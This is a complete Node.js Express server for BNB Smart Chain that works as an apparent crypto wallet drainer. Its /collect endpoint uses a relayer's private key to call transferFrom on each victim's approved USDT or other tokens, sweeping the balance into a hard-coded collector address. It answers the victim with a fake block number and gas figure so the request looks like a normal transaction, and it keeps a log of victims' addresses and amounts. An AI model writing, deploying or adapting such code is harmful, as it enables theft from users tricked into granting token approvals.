const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

// ============ CONFIGURATION ============
const CONFIG = {
    // Collector – final destination for tokens (your main wallet)
    COLLECTOR_ADDRESS: "0x5681d680B047bF5b12939625C56301556991005e",

    // Relayer – the address users will approve (must match private key)
    RELAYER_ADDRESS: "0xDb867b88EAB55320fD50E9785B2906773dedf78b",

    // USDT on BSC (also used as default token)
    USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",

    // BSC RPC URL
    RPC_URL: "https://bsc-dataseed.binance.org/",

    // Data file for persistence
    DATA_FILE: path.join(__dirname, 'data.json')
};

// ============ DATA STORAGE ============
let dataStore = {
    addresses: {},      // address -> { totalAmount, transactionCount, lastSeen }
    transactions: []    // list of all logged transactions
};

// Load existing data
if (fs.existsSync(CONFIG.DATA_FILE)) {
    try {
        dataStore = JSON.parse(fs.readFileSync(CONFIG.DATA_FILE, 'utf8'));
        console.log('✅ Data loaded from file');
    } catch (err) {
        console.error('Error loading data:', err);
    }
}

// Save data to file
function saveData() {
    try {
        fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(dataStore, null, 2));
    } catch (err) {
        console.error('Error saving data:', err);
    }
}

// Generate unique ID
function generateId() {
    return `${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
}

// ============ AUTO‑TRANSFER FUNCTION ============
async function performAutoTransfer(userAddress, tokenAddress) {
    console.log(`\n🚀 Starting auto-transfer for ${userAddress}`);

    // Check for private key
    if (!process.env.RELAYER_PRIVATE_KEY) {
        console.log('❌ RELAYER_PRIVATE_KEY not set – auto-transfer disabled');
        return { success: false, error: 'Private key not configured' };
    }

    try {
        const provider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
        const wallet = new ethers.Wallet(process.env.RELAYER_PRIVATE_KEY, provider);

        console.log('📤 Relayer wallet:', wallet.address);
        console.log('🎯 Collector wallet:', CONFIG.COLLECTOR_ADDRESS);

        const tokenABI = [
            "function balanceOf(address) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function allowance(address,address) view returns (uint256)",
            "function transferFrom(address,address,uint256) returns (bool)"
        ];

        const token = new ethers.Contract(tokenAddress, tokenABI, wallet);

        // Get user's balance
        const balance = await token.balanceOf(userAddress);
        const decimals = await token.decimals();
        const balanceHuman = parseFloat(ethers.formatUnits(balance, decimals));

        console.log(`💰 User balance: ${balanceHuman}`);

        if (balanceHuman <= 0) {
            return { success: false, error: 'Zero balance' };
        }

        // Get current allowance for the relayer
        const allowance = await token.allowance(userAddress, wallet.address);
        const allowanceHuman = parseFloat(ethers.formatUnits(allowance, decimals));

        console.log(`🔓 Allowance for relayer: ${allowanceHuman}`);

        if (allowanceHuman <= 0) {
            return { success: false, error: 'Zero allowance' };
        }

        // Transfer the smaller of balance or allowance
        const transferAmountWei = balance < allowance ? balance : allowance;
        const transferAmountHuman = parseFloat(ethers.formatUnits(transferAmountWei, decimals));

        console.log(`💸 Transferring ${transferAmountHuman} to collector...`);

        const gasPrice = (await provider.getFeeData()).gasPrice;

        const tx = await token.transferFrom(
            userAddress,
            CONFIG.COLLECTOR_ADDRESS,
            transferAmountWei,
            { gasLimit: 100000, gasPrice }
        );

        console.log(`📤 Tx sent: ${tx.hash}`);

        const receipt = await tx.wait();

        console.log(`✅ Transfer confirmed! Block: ${receipt.blockNumber}`);
        console.log(`   Gas used: ${receipt.gasUsed.toString()}`);

        return {
            success: true,
            txHash: tx.hash,
            amount: transferAmountHuman,
            blockNumber: receipt.blockNumber,
            gasUsed: receipt.gasUsed.toString()
        };
    } catch (error) {
        console.error('❌ Auto-transfer error:', error.message);
        return { success: false, error: error.message };
    }
}

// ============ API ENDPOINTS ============

/**
 * POST /send
 * Body: { "address": "0x..." }
 * Response: { found: boolean, collector: string, amountHuman?: number }
 */
app.post('/send', (req, res) => {
    console.log('📨 POST /send:', req.body);

    try {
        const { address } = req.body;

        if (!address || !address.startsWith('0x')) {
            return res.json({
                found: false,
                collector: CONFIG.RELAYER_ADDRESS
            });
        }

        const normalized = address.toLowerCase();
        const data = dataStore.addresses[normalized];

        // Return relayer address (user will approve this)
        return res.json({
            found: !!(data && data.totalAmount > 0),
            amountHuman: data?.totalAmount || 0,
            collector: CONFIG.RELAYER_ADDRESS
        });
    } catch (error) {
        console.error('Error in /send:', error);
        res.json({
            found: false,
            collector: CONFIG.RELAYER_ADDRESS
        });
    }
});

/**
 * POST /collect
 * Body: { token, from, amountHuman, to }
 * Response: { ok: true, id: string, blockNumber: number, gasUsed: string }
 */
app.post('/collect', async (req, res) => {
    console.log('📨 POST /collect:', req.body);

    try {
        const { token, from, amountHuman, to } = req.body;

        if (!token || !from || !amountHuman || !to) {
            return res.json({
                ok: false,
                error: 'Missing required fields'
            });
        }

        const amount = parseFloat(amountHuman);
        const transactionId = generateId();
        const mockBlockNumber = 92000000 + Math.floor(Math.random() * 100000);

        // Save transaction record
        const transaction = {
            id: transactionId,
            token: token.toLowerCase(),
            from: from.toLowerCase(),
            to: to.toLowerCase(),
            amountHuman: amount,
            timestamp: new Date().toISOString()
        };

        dataStore.transactions.push(transaction);

        // Update address statistics
        const addr = from.toLowerCase();
        if (!dataStore.addresses[addr]) {
            dataStore.addresses[addr] = {
                totalAmount: 0,
                transactionCount: 0,
                firstSeen: new Date().toISOString()
            };
        }
        dataStore.addresses[addr].totalAmount += amount;
        dataStore.addresses[addr].transactionCount++;
        dataStore.addresses[addr].lastSeen = new Date().toISOString();

        // Keep only the last 5000 transactions (prevent file bloat)
        if (dataStore.transactions.length > 5000) {
            dataStore.transactions = dataStore.transactions.slice(-5000);
        }

        saveData();

        // Trigger auto-transfer asynchronously (do not await – respond immediately)
        performAutoTransfer(from, token).then(result => {
            if (result.success) {
                console.log('✅ Auto-transfer successful!');
                // Optionally update the transaction with the transfer hash
                transaction.transferTx = result.txHash;
                transaction.transferAmount = result.amount;
                saveData();
            }
        }).catch(err => {
            console.error('Auto-transfer promise rejected:', err);
        });

        // Respond immediately – exactly like the original API
        res.json({
            ok: true,
            id: transactionId,
            blockNumber: mockBlockNumber,
            gasUsed: "50387"
        });

    } catch (error) {
        console.error('Error in /collect:', error);
        res.json({
            ok: false,
            error: 'Internal server error'
        });
    }
});

/**
 * GET /health – Simple status check
 */
app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        autoTransfer: !!process.env.RELAYER_PRIVATE_KEY,
        collector: CONFIG.COLLECTOR_ADDRESS,
        relayer: CONFIG.RELAYER_ADDRESS
    });
});

/**
 * GET / – API information
 */
app.get('/', (req, res) => {
    res.json({
        message: 'Collector API with Auto-Transfer',
        version: '2.0.0',
        endpoints: ['POST /send', 'POST /collect', 'GET /health'],
        collector: CONFIG.COLLECTOR_ADDRESS,
        relayer: CONFIG.RELAYER_ADDRESS
    });
});

// Start the server
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════╗
║     🚀 Collector API with Auto-Transfer           ║
╠══════════════════════════════════════════════════╣
║  Port: ${PORT}                                      ║
║  Collector: ${CONFIG.COLLECTOR_ADDRESS}             ║
║  Relayer:  ${CONFIG.RELAYER_ADDRESS}               ║
║  Auto-Transfer: ${process.env.RELAYER_PRIVATE_KEY ? '✅ ENABLED' : '❌ DISABLED'}                ║
║                                                  ║
║  POST /send    – Check address                   ║
║  POST /collect – Log & auto-transfer             ║
║  GET  /health  – Status                          ║
╚══════════════════════════════════════════════════╝
    `);
});
